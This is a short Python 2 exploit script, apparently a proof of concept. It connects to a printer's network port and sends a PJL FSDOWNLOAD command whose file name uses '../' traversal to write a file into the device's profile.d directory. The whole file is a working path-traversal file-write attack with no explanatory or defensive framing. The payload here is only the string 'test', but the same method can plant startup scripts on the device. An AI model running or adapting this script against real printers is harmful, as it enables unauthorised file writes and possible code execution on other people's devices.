import socket
import sys

test = ('test')

if len(sys.argv) != 3:
    print '\nUsage: pjl_inject.py [ip] [port]\n'
    sys.exit()

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (sys.argv[1], int(sys.argv[2]))
print 'connecting to %s port %s' % server_address
sock.connect(server_address)

dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(test)) + ' NAME="0:/../../rw/var/etc/profile.d/writing_test"\r\n'
dir_query += test
dir_query += '\x1b%-12345X'
sock.sendall(dir_query)
sock.close()
